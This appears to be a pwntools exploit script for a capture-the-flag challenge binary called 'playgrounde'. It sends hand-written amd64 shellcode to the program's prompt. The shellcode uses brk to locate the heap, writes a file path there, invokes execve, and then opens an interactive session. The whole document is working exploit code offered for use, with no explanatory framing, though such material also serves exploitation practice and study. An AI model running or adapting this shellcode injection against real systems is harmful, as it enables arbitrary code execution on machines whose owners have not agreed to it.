#!/usr/bin/env python3
from pwn import *

exe = ELF("./playgrounde")
def conn():
    if args.REMOTE:
        p = remote("addr", 1337)
    else:
        context.terminal = ["foot"]
        p = process([exe.path])
        gdb.attach(p, gdbscript='''

                   b*0x0000555555555767
                   #inside syscall
                   # b*0xc0de0e8
        ''')
    return p
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
shellcode = asm("""
                mov rax,0xc
                syscall 
                mov rdi,rax
                sub rdi,134496
                mov rsi,0
                mov rdx,0
                mov r10,7020098569267261230
                mov [rdi],r10
                add rdi,8
                mov r10,103
                mov [rdi],r10
                sub rdi,8
                mov rax,0x3b
                syscall
                

                """,arch = "amd64")
# shellcode = "\x48\xC7\xC0\x0C\x00\x00\x00\x0F\x05"
if __name__ == "__main__":
    p = conn()
    sla(b"The playground is yours. How do you like to play?",shellcode)







    # good luck pwning :)
    p.interactive()
